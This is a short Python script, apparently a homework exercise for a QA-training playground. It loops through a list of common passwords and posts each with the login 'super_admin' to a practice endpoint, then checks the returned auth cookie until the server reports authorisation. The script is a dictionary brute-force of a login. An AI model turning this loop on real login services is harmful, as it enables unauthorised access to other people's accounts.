import requests
import time


pass1 = [123456, 123456789, "picture1", "password", 12345678, 111111, 123123, 12345, 1234567890, "senha", 1234567, "qwerty", "abc123", "Million2", 000000, 1234, "iloveyou", "aaron431", "password1", "qqww1122"]
payload1 = {}

for i in pass1:
    payload1 = {"login": "super_admin", "password": i}
    print(payload1)
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload1)
    # print(response1.text)
    # print(response1.status_code)
    print(response1.request.body)
    print(dict(response1.cookies))
    c1 = dict(response1.cookies)
    print(f"C! - {c1}")
    cookie = {}
    cookie_value = response1.cookies.get("auth_cookie")
    print(f"cookie_value - {cookie_value}")
    print(f"cookie - {cookie}")
    # # if cookie is not None:
    cookie.update({'auth_cookie': cookie_value})
    print(f"cookie-after - {cookie}")
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie)
    print(response2.text)
    print(response2.request.headers)
    print("-" * 20)
    if "You are authorized" == response2.text:
        break
print("-" * 20)
# print(payload1)
# print(cookie_value)
